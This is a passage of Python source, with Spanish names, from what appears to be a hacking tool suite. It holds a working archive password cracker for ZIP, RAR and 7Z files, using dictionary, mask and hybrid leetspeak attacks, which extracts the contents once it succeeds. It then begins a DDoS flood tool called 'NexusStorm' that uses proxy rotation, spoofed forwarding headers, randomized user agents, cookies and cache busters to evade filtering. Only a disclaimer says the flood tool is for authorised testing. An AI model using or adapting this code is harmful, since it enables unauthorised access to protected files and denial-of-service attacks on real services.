                    for pass_final_generada in palabras_a_procesar_mangle:
                        if self.interrupted: break
                        if not pass_final_generada: continue

                        if not palabra_reanudacion_encontrada:
                            if pass_final_generada == self.last_tried_password_for_resume:
                                palabra_reanudacion_encontrada = True
                                logging.info(f"Reanudación: Se encontró última contraseña '{pass_final_generada}'. Saltando.")
                            # Si no es la contraseña de reanudación, no la yieldeamos aún
                            continue 
                        
                        # Si palabra_reanudacion_encontrada es True, y esta no es la de reanudación, la yieldeamos.
                        # O si reanudar_activado es False desde el inicio.
                        yield pass_final_generada
        
        except FileNotFoundError: pass # Ya manejado en _abrir_diccionario
        except Exception as e_gen_dict:
            UI.imprimir_error(f"Error fatal en generador de diccionario: {e_gen_dict}")
            logging.critical(f"Error fatal en generador de diccionario: {e_gen_dict}", exc_info=True)
        finally:
            logging.info(f"Generador de diccionario procesó {contador_lineas_base} líneas base.")

    def _generador_mascara(self, mascara_str, charsets_pers=None):
        componentes_mascara, longitudes_componentes = [], []
        idx_mascara = 0
        while idx_mascara < len(mascara_str):
            if self.interrupted: break
            if mascara_str[idx_mascara] == '?':
                if idx_mascara + 1 < len(mascara_str):
                    tipo_char_mascara = mascara_str[idx_mascara+1]
                    current_charset = []
                    if charsets_pers and tipo_char_mascara in charsets_pers:
                        current_charset = list(charsets_pers[tipo_char_mascara])
                    elif tipo_char_mascara in self.CARACTERES_DEFAULT:
                        current_charset = list(self.CARACTERES_DEFAULT[tipo_char_mascara])
                    elif tipo_char_mascara == 'a':
                        current_charset = list(self.CARACTERES_DEFAULT['l'] + self.CARACTERES_DEFAULT['u'] + self.CARACTERES_DEFAULT['d'] + self.CARACTERES_DEFAULT['s'])
                    else: 
                        current_charset = ['?', tipo_char_mascara] # Literal ? y el caracter
                        idx_mascara +=1 # Avanzar solo 1 para el tipo, no 2
                    componentes_mascara.append(current_charset)
                    longitudes_componentes.append(len(current_charset))
                    idx_mascara += 2
                else: 
                    componentes_mascara.append(['?']); longitudes_componentes.append(1); idx_mascara += 1
            else: 
                componentes_mascara.append([mascara_str[idx_mascara]]); longitudes_componentes.append(1); idx_mascara += 1
        
        if not componentes_mascara: yield ""; return

        reanudar_activado = self.last_tried_password_for_resume is not None
        palabra_reanudacion_encontrada = not reanudar_activado

        for p_mascara_tupla in itertools.product(*componentes_mascara):
            if self.interrupted: break
            password_generada = "".join(p_mascara_tupla)
            
            if not palabra_reanudacion_encontrada:
                if password_generada == self.last_tried_password_for_resume:
                    palabra_reanudacion_encontrada = True
                    logging.info(f"Reanudación (Máscara): Se encontró última pass '{password_generada}'. Saltando.")
                continue
            
            yield password_generada

    def _generador_hibrido(self, ruta_dicc_base, chars_variacion_str, modo_variacion, aplicar_leet, aplicar_anios, palabras_clave_adicionales):
        gen_dicc_base = self._generador_diccionario_con_mangle(ruta_dicc_base) # El diccionario base puede tener su propio mangleo
        
        leetspeak_map_hibrido = {'a': ['@', '4'], 'e': ['3'], 'i': ['1', '!', '|'], 'o': ['0'], 's': ['$', '5'], 't': ['7'], 'l':['1'], 'g':['9','6'], 'b':['8','6']}
        anios_comunes_hibrido = [str(y) for y in range(datetime.now().year - 10, datetime.now().year + 3)] # Rango más amplio
        anios_comunes_cortos_hibrido = [a[2:] for a in anios_comunes_hibrido]
        simbolos_comunes_hibrido = ["!", "@", "#", "$", "%", "?", "*", "_", "-", "."]
        
        # Para reanudar, si last_tried_password_for_resume existe, debemos iterar sobre las
        # contraseñas generadas hasta encontrarla, luego empezar a yield.
        reanudar_activado = self.last_tried_password_for_resume is not None
        palabra_reanudacion_encontrada = not reanudar_activado

        for palabra_base_de_dicc in gen_dicc_base: # Este ya maneja su propia reanudación interna si aplica
            if self.interrupted: break
            
            variaciones_actuales_hibrido = {palabra_base_de_dicc}
            
            # 1. Mayúsculas/Minúsculas/Capitalización inicial
            casos_temp = set()
            for p_caso in variaciones_actuales_hibrido:
                casos_temp.add(p_caso.lower())
                casos_temp.add(p_caso.upper())
                casos_temp.add(p_caso.capitalize())
            variaciones_actuales_hibrido.update(casos_temp)

            # 2. Leetspeak (si está activado)
            if aplicar_leet:
                leet_temp = set()
                for p_leet_base in list(variaciones_actuales_hibrido): # Iterar sobre copia
                    # Aplicar reemplazos de leetspeak (simple, no todas las combinaciones)
                    p_leet_mod = p_leet_base
                    for char_orig, reemplazos_leet in leetspeak_map_hibrido.items():
                        if reemplazos_leet: # Tomar el primer reemplazo
                            p_leet_mod = p_leet_mod.replace(char_orig, reemplazos_leet[0])
                            p_leet_mod = p_leet_mod.replace(char_orig.upper(), reemplazos_leet[0]) # También para mayúsculas
                    if p_leet_mod != p_leet_base: leet_temp.add(p_leet_mod)
                variaciones_actuales_hibrido.update(leet_temp)

            # 3. Añadir años, símbolos, palabras clave
            elementos_a_anadir = list(palabras_clave_adicionales)
            if aplicar_anios:
                elementos_a_anadir.extend(anios_comunes_hibrido)
                elementos_a_anadir.extend(anios_comunes_cortos_hibrido)
            elementos_a_anadir.extend(simbolos_comunes_hibrido) # Añadir símbolos siempre como una opción básica

            anadidos_temp = set()
            for p_anadir_base in list(variaciones_actuales_hibrido):
                for item_anadir in elementos_a_anadir:
                    anadidos_temp.add(p_anadir_base + item_anadir) # Sufijo
                    anadidos_temp.add(item_anadir + p_anadir_base) # Prefijo
            variaciones_actuales_hibrido.update(anadidos_temp)

            # 4. Variaciones con caracteres custom (chars_variacion_str)
            if chars_variacion_str:
                chars_var_list = list(chars_variacion_str) # Cada caracter es una variación
                var_custom_temp = set()
                for p_custom_base in list(variaciones_actuales_hibrido):
                    for char_var in chars_var_list:
                        if modo_variacion in ["S", "A"]: var_custom_temp.add(p_custom_base + char_var) # Sufijo
                        if modo_variacion in ["P", "A"]: var_custom_temp.add(char_var + p_custom_base) # Prefijo
                variaciones_actuales_hibrido.update(var_custom_temp)

            for password_final_hibrida in variaciones_actuales_hibrido:
                if self.interrupted: break
                if not password_final_hibrida: continue

                if not palabra_reanudacion_encontrada:
                    if password_final_hibrida == self.last_tried_password_for_resume:
                        palabra_reanudacion_encontrada = True
                        logging.info(f"Reanudación (Híbrido): Se encontró última pass '{password_final_hibrida}'. Saltando.")
                    continue
                
                yield password_final_hibrida
    
    def _contar_lineas_diccionario(self, ruta_dicc):
        # Estimación rápida, puede ser imprecisa con mangleo complejo
        count = 0
        try:
            with self._abrir_diccionario(ruta_dicc) as f:
                for _ in f:
                    count += 1
            return count
        except Exception:
            return 0 # No se pudo contar

    def _estimar_combinaciones_mascara(self, mascara, charsets_pers):
        total_estimado = 1
        idx = 0
        while idx < len(mascara):
            if mascara[idx] == '?':
                if idx + 1 < len(mascara):
                    tipo_char = mascara[idx+1]
                    charset_len = 0
                    if charsets_pers and tipo_char in charsets_pers:
                        charset_len = len(charsets_pers[tipo_char])
                    elif tipo_char in self.CARACTERES_DEFAULT:
                        charset_len = len(self.CARACTERES_DEFAULT[tipo_char])
                    elif tipo_char == 'a':
                        charset_len = sum(len(s) for s in self.CARACTERES_DEFAULT.values())
                    else: # Literal
                        charset_len = 1 
                    
                    if charset_len > 0: total_estimado *= charset_len
                    if total_estimado > 10**12: return float('inf') # Evitar overflow y cálculos largos
                    idx += 2
                else: # '?' al final, literal
                    idx += 1
            else: # Caracter literal
                idx += 1
        return total_estimado if total_estimado > 1 else 0


    def descifrar(self):
        self.interrupted = False
        self.current_cracking_file_path = UI.obtener_entrada("[+] Ruta del archivo cifrado (ZIP/RAR/7Z): ", requerido=True)
        if not self.current_cracking_file_path or not os.path.exists(self.current_cracking_file_path):
            UI.imprimir_error("¡Archivo no encontrado o ruta inválida!"); logging.error(f"Archivo a descifrar no encontrado: {self.current_cracking_file_path}"); return

        ext = os.path.splitext(self.current_cracking_file_path)[1].lower()
        if ext == '.rar' and not RARFILE_DISPONIBLE:
            UI.imprimir_error("Librería 'rarfile' no disponible (pip install rarfile). Descifrado RAR imposible."); return
        if ext == '.7z' and not PY7ZR_DISPONIBLE:
            UI.imprimir_error("Librería 'py7zr' no disponible (pip install py7zr). Descifrado 7Z imposible."); return
        if ext not in ['.zip', '.rar', '.7z']:
            UI.imprimir_error(f"Formato de archivo '{ext}' no soportado para descifrado."); return

        self.last_tried_password_for_resume = None
        if UI.obtener_entrada(f"[+] ¿Reanudar sesión para '{os.path.basename(self.current_cracking_file_path)}' (si existe)? (s/n)", default="s", tipo=bool):
            self._cargar_sesion_crack()
        else:
            self._limpiar_sesion_crack()

        UI.imprimir_mensaje("\n[+] Selecciona el tipo de ataque de descifrado:", Colores.CYAN)
        UI.imprimir_mensaje("[1] Ataque de Diccionario (con Mangleo opcional)", Colores.BLANCO)
        UI.imprimir_mensaje("[2] Ataque de Fuerza Bruta (Máscara)", Colores.BLANCO)
        UI.imprimir_mensaje("[3] Ataque Híbrido (Diccionario + Variaciones Avanzadas)", Colores.BLANCO)
        opcion_ataque = UI.obtener_entrada("[+] Opción de ataque: ", tipo=int, opciones_validas=range(1,4), default=1)

        generador_pass = None
        total_pass_estimado = 0

        if opcion_ataque == 1: # Diccionario
            ruta_dicc = UI.obtener_entrada("[+] Ruta del archivo de diccionario (.txt, .gz, .bz2): ", requerido=True)
            if not ruta_dicc or not os.path.exists(ruta_dicc): UI.imprimir_error("Diccionario no encontrado."); return
            
            UI.imprimir_mensaje("Reglas de Mangleo (opcional, separadas por coma):", Colores.CYAN)
            UI.imprimir_mensaje("  $:char_a_anadir (ej: $:123) - Añade al final", Colores.GRIS)
            UI.imprimir_mensaje("  ^:char_a_prefijar (ej: ^ABC) - Añade al principio", Colores.GRIS)
            UI.imprimir_mensaje("  s:viejo:nuevo (ej: s:a:@) - Sustituye todas las ocurrencias", Colores.GRIS)
            UI.imprimir_mensaje("  c - Capitaliza (primera letra mayúscula, resto minúsculas)", Colores.GRIS)
            UI.imprimir_mensaje("  u - Convierte a MAYÚSCULAS", Colores.GRIS)
            UI.imprimir_mensaje("  l - Convierte a minúsculas", Colores.GRIS)
            UI.imprimir_mensaje("  d - Duplica la palabra (palabrapalabra)", Colores.GRIS)
            UI.imprimir_mensaje("  r - Invierte la palabra (alorpalab)", Colores.GRIS)
            UI.imprimir_mensaje("  t - Alterna capitalización (PaLaBrA -> pAlAbRa)", Colores.GRIS)
            UI.imprimir_mensaje("  t:N;M - Alterna capitalización en posiciones N y M (0-indexed)", Colores.GRIS)
            UI.imprimir_mensaje("  L - Leetspeak simple (a=@, e=3, i=1, o=0, s=$, t=7)", Colores.GRIS)
            reglas_mangleo = UI.obtener_entrada("[+] Reglas de Mangleo (ej: c,s:e:3,$:!): ", default="", requerido=False)
            
            total_pass_estimado = self._contar_lineas_diccionario(ruta_dicc)
            if reglas_mangleo: total_pass_estimado = float('inf') # Difícil de estimar con mangleo
            generador_pass = self._generador_diccionario_con_mangle(ruta_dicc, reglas_mangleo)
        
        elif opcion_ataque == 2: # Máscara
            UI.imprimir_mensaje("Definición de Máscara:", Colores.CYAN)
            UI.imprimir_mensaje("  ?l = abcdefghijklmnopqrstuvwxyz", Colores.GRIS)
            UI.imprimir_mensaje("  ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ", Colores.GRIS)
            UI.imprimir_mensaje("  ?d = 0123456789", Colores.GRIS)
            UI.imprimir_mensaje("  ?s = !@#$%^&*()-_=+[]{};:'\",.<>/?`~", Colores.GRIS)
            UI.imprimir_mensaje("  ?a = Todos los anteriores (?l?u?d?s)", Colores.GRIS)
            UI.imprimir_mensaje("  ?1, ?2, etc. = Charsets custom definidos abajo", Colores.GRIS)
            UI.imprimir_mensaje("  Cualquier otro caracter se usa literalmente.", Colores.GRIS)
            mascara = UI.obtener_entrada("[+] Introduce la máscara (ej: Pass?d?d?s?1): ", requerido=True)
            if not mascara: UI.imprimir_error("Máscara no puede estar vacía."); return
            
            charsets_custom_str = UI.obtener_entrada("[+] Charsets custom (opc, ej: 1=abc,2=#@!): ", default="", requerido=False)
            charsets_custom = {}
            if charsets_custom_str:
                try:
                    for part in charsets_custom_str.split(','):
                        k, v = part.split('=', 1)
                        charsets_custom[k.strip()] = v.strip()
                except ValueError: UI.imprimir_error("Formato de charsets custom inválido."); return
            
            total_pass_estimado = self._estimar_combinaciones_mascara(mascara, charsets_custom)
            generador_pass = self._generador_mascara(mascara, charsets_custom)

        elif opcion_ataque == 3: # Híbrido
            ruta_dicc_base_h = UI.obtener_entrada("[+] Ruta del diccionario base para híbrido: ", requerido=True)
            if not ruta_dicc_base_h or not os.path.exists(ruta_dicc_base_h): UI.imprimir_error("Diccionario base no encontrado."); return
            
            chars_var_h = UI.obtener_entrada("[+] Caracteres para añadir (sufijo/prefijo, opc, ej: 123!@#): ", default="", requerido=False)
            modo_var_h = "A"
            if chars_var_h:
                 modo_var_h = UI.obtener_entrada("[+] Aplicar como [P]refijo, [S]ufijo, o [A]mbos? (P/S/A)", default="A", opciones_validas=["P","S","A"]).upper()
            
            aplicar_leet_h = UI.obtener_entrada("[+] ¿Aplicar Leetspeak simple? (s/n)", default="s", tipo=bool)
            aplicar_anios_h = UI.obtener_entrada("[+] ¿Añadir años comunes y símbolos? (s/n)", default="s", tipo=bool)
            palabras_clave_h_str = UI.obtener_entrada("[+] Palabras clave adicionales (coma sep, opc): ", default="", requerido=False)
            palabras_clave_h_list = [kw.strip() for kw in palabras_clave_h_str.split(',') if kw.strip()]
            
            total_pass_estimado = float('inf') # Muy difícil de estimar para híbrido
            generador_pass = self._generador_hibrido(ruta_dicc_base_h, chars_var_h, modo_var_h, aplicar_leet_h, aplicar_anios_h, palabras_clave_h_list)
        else: return

        if not generador_pass: UI.imprimir_error("No se pudo inicializar el generador de contraseñas."); return

        UI.imprimir_mensaje(f"Iniciando ataque en {os.path.basename(self.current_cracking_file_path)}...", Colores.CYAN)
        if total_pass_estimado == float('inf'):
            UI.imprimir_advertencia("El número total de contraseñas a probar es muy grande o difícil de estimar.")
        elif total_pass_estimado > 0 :
             UI.imprimir_mensaje(f"Se probarán aproximadamente {total_pass_estimado:.0f} contraseñas (esta estimación puede variar con mangleo/híbrido).", Colores.CYAN)
        else:
            UI.imprimir_advertencia("No se generarán contraseñas con la configuración actual.")
            return

        contrasena_encontrada = None
        tiempo_inicio = time.time()
        intentos = 0
        guardar_sesion_intervalo = CONFIG.get("crack_session_save_interval", 2000) # Guardar cada N intentos

        zf, rf, path_7z = None, None, None
        try:
            if ext == ".zip": zf = zipfile.ZipFile(self.current_cracking_file_path)
            elif ext == ".rar": rf = rarfile.RarFile(self.current_cracking_file_path) # rarfile.UNRAR_TOOL debe estar configurado si es necesario
            elif ext == ".7z": path_7z = self.current_cracking_file_path
        except rarfile.NeedFirstVolume: UI.imprimir_error("RAR multi-volumen. Por favor, proporciona el primer volumen (.part1.rar o .rar)."); return
        except (rarfile.BadRarFile, zipfile.BadZipFile, py7zr.exceptions.Bad7zFile if PY7ZR_DISPONIBLE else OSError) as e_badfile: # OSError si py7zr no está
            UI.imprimir_error(f"Archivo dañado, formato incorrecto o contraseña incorrecta: {e_badfile}"); return
        except Exception as e_open_archive:
            UI.imprimir_error(f"Error abriendo archivo comprimido: {e_open_archive}"); return
        
        pbar = None
        tqdm_total_val = None if total_pass_estimado == float('inf') else int(total_pass_estimado)
        
        if TQDM_DISPONIBLE:
            pbar_desc = f"{Colores.MAGENTA}Descifrando{Colores.RESET}"
            pbar = tqdm(total=tqdm_total_val, unit=" pass", ncols=100, desc=pbar_desc, 
                        bar_format=f'{{l_bar}}{Colores.CYAN}{{bar}}{Colores.RESET}| {{n_fmt}}{{"/"+str(tqdm_total_val) if tqdm_total_val else ""}} [{{elapsed}}<{{remaining}}, {{rate_fmt}}]')
        
        last_pass_tried = ""
        try:
            for password_actual in generador_pass:
                if self.interrupted: break
                intentos += 1
                last_pass_tried = password_actual # Guardar antes de intentar

                if pbar: pbar.update(1)
                else:
                    if intentos % 1000 == 0: print(f"{Colores.GRIS}[*] Probadas {intentos} contraseñas... Ultima: {password_actual[:25].ljust(25)}{Colores.RESET}", end='\r', flush=True)
                
                found = False
                if ext == ".zip":
                    if self._intentar_zip(zf, password_actual, pbar): found = True
                elif ext == ".rar":
                    if self._intentar_rar(rf, password_actual, pbar): found = True
                elif ext == ".7z":
                    if self._intentar_7z(path_7z, password_actual, pbar): found = True
                
                if found:
                    contrasena_encontrada = password_actual
                    self._limpiar_sesion_crack()
                    break
                
                if intentos % guardar_sesion_intervalo == 0:
                    self._guardar_sesion_crack(password_actual)
            
            if not contrasena_encontrada and last_pass_tried and not self.interrupted: # Guardar la última si el generador se agotó
                 self._guardar_sesion_crack(last_pass_tried)

        except (KeyboardInterrupt, SystemExit):
            self.interrupted = True
            UI.imprimir_advertencia("\nProceso de descifrado interrumpido por el usuario.")
            logging.warning("Descifrado interrumpido por usuario.")
            if last_pass_tried:
                self._guardar_sesion_crack(last_pass_tried)
                UI.imprimir_mensaje(f"Sesión guardada. Última contraseña probada: {last_pass_tried[:30]}...")
        except Exception as e_crack_loop:
            UI.imprimir_error(f"\nError crítico durante el descifrado: {e_crack_loop}")
            logging.critical(f"Error crítico en bucle de descifrado: {e_crack_loop}", exc_info=True)
            if last_pass_tried: self._guardar_sesion_crack(last_pass_tried)
        finally:
            if pbar: pbar.close()
            if zf: zf.close()
            if rf: rf.close() # rf.close() es importante
            print("\033[K", end='\r') # Limpiar línea de progreso residual

        tiempo_fin = time.time()
        tiempo_transcurrido = tiempo_fin - tiempo_inicio

        if contrasena_encontrada:
            UI.imprimir_exito(f"¡CONTRASEÑA ENCONTRADA!: {Colores.BLANCO}{Colores.NEGRITA}{contrasena_encontrada}{Colores.RESET}")
            logging.info(f"Contraseña encontrada para {self.current_cracking_file_path}: '{contrasena_encontrada}'")
            # Opcional: extraer el archivo a un subdirectorio
            if UI.obtener_entrada(f"[+] ¿Extraer contenido de '{os.path.basename(self.current_cracking_file_path)}' ahora? (s/n)", tipo=bool, default='s'):
                extract_path = f"./{os.path.splitext(os.path.basename(self.current_cracking_file_path))[0]}_extracted"
                try:
                    os.makedirs(extract_path, exist_ok=True)
                    if ext == ".zip":
                        with zipfile.ZipFile(self.current_cracking_file_path) as z_final:
                            z_final.extractall(path=extract_path, pwd=contrasena_encontrada.encode('utf-8', 'surrogateescape'))
                    elif ext == ".rar" and RARFILE_DISPONIBLE:
                        with rarfile.RarFile(self.current_cracking_file_path) as r_final:
                            r_final.extractall(path=extract_path, pwd=contrasena_encontrada)
                    elif ext == ".7z" and PY7ZR_DISPONIBLE:
                         with py7zr.SevenZipFile(self.current_cracking_file_path, mode='r', password=contrasena_encontrada) as sz_final:
                            sz_final.extractall(path=extract_path)
                    UI.imprimir_exito(f"Archivos extraídos a: {extract_path}")
                except Exception as e_extract:
                    UI.imprimir_error(f"Error al extraer archivos: {e_extract}")
                    logging.error(f"Error extrayendo {self.current_cracking_file_path}: {e_extract}", exc_info=True)

        elif not self.interrupted : # Solo si no fue interrumpido
            UI.imprimir_error("Contraseña no encontrada después de probar todas las combinaciones.")
            logging.info(f"Contraseña no encontrada para {self.current_cracking_file_path} tras {intentos} intentos.")
        
        UI.imprimir_mensaje(f"Total de intentos: {intentos}. Tiempo transcurrido: {tiempo_transcurrido:.2f} segundos.", Colores.CYAN)
        self.current_cracking_file_path = None
        self.interrupted = False


# ===== [ SIMULADOR DDOS "NEXUSSTORM" ] =====
class SimuladorDDoS:
    ART_ASCII = f"""{Colores.ROJO}
███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗ ██████╗ ████████╗ ██████╗  ██████╗ ███╗   ███╗
████╗  ██║██╔════╝██║  ██║╚██╗ ██╔╝██╔════╝██╔═══██╗╚══██╔══╝██╔═══██╗██╔═══██╗████╗ ████║
██╔██╗ ██║█████╗  ███████║ ╚████╔╝ ███████╗██║   ██║   ██║   ██║   ██║██║   ██║██╔████╔██║
██║╚██╗██║██╔══╝  ██╔══██║  ╚██╔╝  ╚════██║██║   ██║   ██║   ██║   ██║██║   ██║██║╚██╔╝██║
██║ ╚████║███████╗██║  ██║   ██║   ███████║╚██████╔╝   ██║   ╚██████╔╝╚██████╔╝██║ ╚═╝ ██║
╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝    ╚═╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝
{Colores.BLANCO}                              Simulador DDoS "NexusStorm"{Colores.ROJO}
    {Colores.RESET}"""
    
    USER_AGENTS_LIST = [ # Lista más extensa y actualizada
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.2210.77",
        "Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18",
        CONFIG.get("default_user_agent", "DarkCoderOmegaBot/8.0")
    ]
    REFERERS_LIST = [
        "https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/", "https://www.yahoo.com/", "https://yandex.com/",
        "https://www.facebook.com/", "https://www.twitter.com/", "https://www.instagram.com/", "https://www.linkedin.com/", "https://www.reddit.com/"
    ]
    HTTP_METHODS_SUPPORTED = ["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS", "PATCH"] # Para ataques HTTP avanzados

    def __init__(self):
        UI.imprimir_mensaje(self.ART_ASCII, Colores.ROJO, prefix="")
        self.proceder = self._confirmar_uso_responsable()
        self.paquetes_enviados = 0
        self.bytes_enviados = 0 # Nuevo para UDP/TCP
        self.conexiones_activas_slowloris = 0
        self.ataque_en_curso = False
        self.lock = threading.Lock()
        self.sockets_slowloris_list = []
        self.proxies_disponibles = []
        self.threads = []
        logging.info("Simulador DDoS inicializado.")

    def _confirmar_uso_responsable(self):
        UI.imprimir_mensaje("="*80, Colores.AMARILLO + Colores.NEGRITA)
        UI.imprimir_info_critica("ADVERTENCIA EXTREMA: EL USO DE ESTA HERRAMIENTA DE SIMULACIÓN DDOS")
        UI.imprimir_info_critica("ESTÁ RESTRINGIDO A FINES EDUCATIVOS, DE INVESTIGACIÓN Y PRUEBAS")
        UI.imprimir_info_critica("EN SISTEMAS Y REDES DE SU PROPIEDAD O CON PERMISO EXPLÍCITO,")
        UI.imprimir_info_critica("DOCUMENTADO Y VERIFICABLE DEL PROPIETARIO. EL USO NO AUTORIZADO")
        UI.imprimir_info_critica("ES ILEGAL, ANTIÉTICO Y PUEDE CAUSAR DAÑOS SIGNIFICATIVOS.")
        UI.imprimir_info_critica("EL AUTOR NO SE HACE RESPONSABLE DEL MAL USO DE ESTA HERRAMIENTA.")
        UI.imprimir_mensaje("="*80, Colores.AMARILLO + Colores.NEGRITA)
        confirmacion = UI.obtener_entrada("¿Declara solemnemente entender y aceptar estas condiciones y proceder bajo su TOTAL responsabilidad? (escriba 'ACEPTO' para continuar): ", Colores.ROJO)
        if confirmacion and confirmacion.upper() == "ACEPTO":
            logging.warning("Usuario aceptó las condiciones de uso responsable del Simulador DDoS.")
            return True
        else:
            UI.imprimir_error("Uso responsable no confirmado explícitamente. Saliendo del Simulador DDoS.")
            logging.warning("Usuario NO aceptó las condiciones de uso del Simulador DDoS.")
            return False

    def _cargar_proxies_ddos(self, ruta_archivo_proxies_ddos):
        self.proxies_disponibles = []
        if not ruta_archivo_proxies_ddos or not os.path.exists(ruta_archivo_proxies_ddos):
            logging.info(f"Archivo de proxies para DDoS '{ruta_archivo_proxies_ddos}' no encontrado o no especificado.")
            return
        try:
            with open(ruta_archivo_proxies_ddos, 'r') as f_proxies:
                for linea_proxy in f_proxies:
                    linea_proxy_strip = linea_proxy.strip()
                    if linea_proxy_strip and not linea_proxy_strip.startswith("#"):
                        parsed_proxy = urlparse(linea_proxy_strip)
                        if parsed_proxy.scheme and parsed_proxy.netloc:
                            self.proxies_disponibles.append({"http": linea_proxy_strip, "https": linea_proxy_strip}) # Formato para requests
            UI.imprimir_exito(f"Cargados {len(self.proxies_disponibles)} proxies para el ataque.")
            logging.info(f"Cargados {len(self.proxies_disponibles)} proxies desde {ruta_archivo_proxies_ddos}")
        except Exception as e_proxies_ddos:
            UI.imprimir_error(f"Error cargando proxies: {e_proxies_ddos}")
            logging.error(f"Error cargando proxies desde {ruta_archivo_proxies_ddos}: {e_proxies_ddos}", exc_info=True)

    def _get_random_proxy(self):
        return random.choice(self.proxies_disponibles) if self.proxies_disponibles else None

    def _generar_ip_spoof_privada(self):
        clase_a = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        clase_b = f"172.{random.randint(16,31)}.{random.randint(0,255)}.{random.randint(1,254)}"
        clase_c = f"192.168.{random.randint(0,255)}.{random.randint(1,254)}"
        return random.choice([clase_a, clase_b, clase_c])

    def resolver_objetivo(self, host_o_ip):
        try:
            ip = socket.gethostbyname(host_o_ip)
            UI.imprimir_info_critica(f"Objetivo '{host_o_ip}' resuelto a IP: {ip}", prefix="[RESOLVED] ")
            return ip
        except socket.gaierror:
            UI.imprimir_error(f"No se pudo resolver el hostname: {host_o_ip}")
            logging.error(f"Fallo al resolver hostname para DDoS: {host_o_ip}")
            return None

    def _worker_http_generic(self, ip_objetivo_real, puerto_objetivo, tiempo_fin, metodo_http, config_payload):
        sesion = requests.Session()
        sesion.headers.update({"User-Agent": random.choice(self.USER_AGENTS_LIST)})
        
        esquema = 'https' if puerto_objetivo == 443 or puerto_objetivo == 8443 else 'http'
        # Usar el host original para el Host header y SNI (con proxies)
        # Usar la IP real para la conexión directa si no hay proxy
        target_url_for_request = f"{esquema}://{config_payload['host_header']}:{puerto_objetivo}{config_payload['path']}"
        # Si no hay proxy, requests usará la IP de 'host_header' si es una IP, o resolverá el dominio.
        # Para forzar la IP de conexión directa, se podría usar un Transport Adapter, pero es complejo.
        # Más simple: si no hay proxy, y host_header es un dominio, la petición va al DNS resuelto. Si es IP, va a esa IP.
        # Si hay proxy, el proxy maneja la resolución/conexión a config_payload['host_header'].

        while time.time() < tiempo_fin and self.ataque_en_curso:
            headers_peticion = {
                "Accept": random.choice(["*/*", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "application/json, text/plain, */*"]),
                "Accept-Language": random.choice(["en-US,en;q=0.5", "es-ES,es;q=0.3", "de-DE,de;q=0.2", "*;q=0.1"]),
                "Accept-Encoding": random.choice(["gzip, deflate, br", "gzip, deflate", "identity"]),
                "Connection": config_payload.get('connection_type', 'close'),
                "X-Forwarded-For": self._generar_ip_spoof_privada(),
                "Via": f"1.1 {self._generar_ip_spoof_privada()}", # Simular paso por otro proxy
                "Referer": random.choice(self.REFERERS_LIST) + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(5,15))),
            }
            if config_payload.get('cache_control', False):
                 headers_peticion["Cache-Control"] = random.choice(["no-cache", "no-store", "max-age=0"])
                 headers_peticion["Pragma"] = "no-cache"

            if config_payload.get('cookies_aleatorias', False):
                num_cookies = random.randint(1,4)
                cookie_parts = []
                for _ in range(num_cookies):
                    cookie_name = "".join(random.choices("abcdefghij", k=random.randint(4,8)))
                    cookie_val = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(10,32)))
                    cookie_parts.append(f"{cookie_name}={cookie_val}")
                headers_peticion["Cookie"] = "; ".join(cookie_parts)

            # Custom headers
            for _ in range(random.randint(0,3)): # 0 a 3 custom headers
                custom_header_name = f"X-DarkCoder-{random.randint(1000,9999)}"
                custom_header_value = base64.b64encode(os.urandom(random.randint(8,24))).decode('utf-8')
                headers_peticion[custom_header_name] = custom_header_value


            proxy_actual = self._get_random_proxy()
            payload_datos = None
            params_get = None

            if metodo_http in ["POST", "PUT", "PATCH"]:
                headers_peticion["Content-Type"] = config_payload.get('content_type', "application/octet-stream")
                if "x-www-form-urlencoded" in headers_peticion["Content-Type"]:
                    form_data = {}
                    for i in range(random.randint(2,6)):
                        key = "".join(random.choices("abcdef", k=random.randint(3,7))) + str(i)
                        value = "".join(random.choices("alphanum123", k=random.randint(5,20)))
                        form_data[key] = value
                    payload_datos = urlencode(form_data).encode('utf-8')
                elif "json" in headers_peticion["Content-Type"]:
                     json_data = {}
                     for i in range(random.randint(2,6)):
                        key = "".join(random.choices("jklmno", k=random.randint(3,7))) + str(i)
                        value = "".join(random.choices("jsonval789", k=random.randint(5,20))) if random.choice([True,False]) else random.randint(1,1000)
                        json_data[key] = value
                     payload_datos = json.dumps(json_data).encode('utf-8')
                else: # generic payload
                    payload_datos = config_payload.get('payload_base', b'')
                
                headers_peticion["Content-Length"] = str(len(payload_datos))
            
            if metodo_http == "GET" or config_payload.get('random_get_params', False):
                params_get = {"_": time.time()} # Cache buster
                for i in range(random.randint(1,5)):
                    key = "".join(random.choices("xyz",k=random.randint(2,4)))+str(i)
                    value = "".join(random.choices("getval",k=random.randint(3,10)))+str(random.randint(1000,9999))
                    params_get[key] = value

